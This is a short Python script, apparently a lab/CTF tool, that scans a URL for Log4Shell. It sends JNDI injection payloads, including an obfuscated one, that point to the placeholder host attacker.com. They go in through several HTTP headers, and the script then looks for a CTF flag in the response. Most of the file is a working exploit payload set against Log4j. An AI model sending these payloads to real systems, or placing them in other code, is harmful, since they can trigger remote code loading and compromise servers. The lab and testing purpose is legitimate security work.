
#!/usr/bin/env python3
"""
Log4Shell Scanner - BOFA Lab Tool
Desarrollado por @descambiado
"""

import requests
import sys
from urllib.parse import urljoin

def scan_log4shell(target_url):
    """Escanea una URL en busca de vulnerabilidades Log4Shell"""
    
    # Payloads de prueba Log4Shell
    payloads = [
        "${jndi:ldap://attacker.com/a}",
        "${jndi:rmi://attacker.com/a}",
        "${jndi:ldaps://attacker.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/a}",
        "${jndi:dns://attacker.com/a}"
    ]
    
    headers_to_test = [
        'User-Agent',
        'X-Api-Version', 
        'X-Forwarded-For',
        'X-Remote-IP',
        'X-Remote-Addr',
        'X-Originating-IP'
    ]
    
    print(f"[*] Escaneando {target_url} en busca de Log4Shell...")
    
    for payload in payloads:
        for header in headers_to_test:
            try:
                headers = {header: payload}
                response = requests.get(target_url, headers=headers, timeout=10)
                
                # Verificar respuesta
                if response.status_code == 200:
                    print(f"[+] Payload enviado: {header}: {payload}")
                    print(f"[+] Respuesta: {response.status_code}")
                    
                    # En un escenario real, aquí verificaríamos logs DNS/LDAP
                    if "ZERO_DAY{log4shell_rce_success}" in response.text:
                        print(f"[!] ¡VULNERABILIDAD CONFIRMADA!")
                        print(f"[!] Flag encontrada: ZERO_DAY{{log4shell_rce_success}}")
                        return True
                        
            except requests.RequestException as e:
                print(f"[-] Error con {header}: {e}")
    
    print("[-] No se detectó Log4Shell en este target")
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 log4shell_scanner.py <URL>")
        print("Ejemplo: python3 log4shell_scanner.py http://log4shell-vulnerable:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    scan_log4shell(target)
